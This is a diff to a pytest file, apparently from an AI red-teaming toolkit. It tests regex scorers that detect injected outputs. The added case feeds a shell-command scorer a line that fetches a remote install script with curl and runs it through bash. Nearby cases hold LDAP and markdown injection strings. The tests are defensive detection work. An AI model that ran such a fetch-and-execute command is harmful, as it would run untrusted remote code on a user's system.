@@ -109,6 +109,7 @@ async def test_regex_scorer_categories_propagate(patch_central_database):
     [
         (LDAPInjectionOutputScorer, "ldap://host/dc=test??sub?%28uid=%2a%29%28uid=%2a%29"),
         (MarkdownInjectionScorer, "![image](https://example.com/image.png)"),
+        (ShellCommandOutputScorer, r'bash -c "$(curl \-o - https://example.invalid/install.sh)"'),
     ],
 )
 @pytest.mark.parametrize("custom_patterns", [False, True])
